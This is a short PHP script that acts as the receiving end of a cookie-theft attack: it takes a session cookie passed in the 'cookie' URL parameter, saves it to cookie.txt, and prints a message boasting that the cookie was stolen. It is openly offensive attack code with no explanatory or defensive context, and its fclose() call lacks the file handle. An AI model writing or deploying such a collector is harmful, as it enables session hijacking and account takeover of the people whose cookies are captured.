<?php     
$savedata =  $_GET['cookie'];
$savecookiefile = fopen("cookie.txt", "w") or die("Unable to open file!");    
fwrite($savecookiefile, $savedata);    
fclose();    

echo "I just stole your session cookie which was " . $savedata;
?>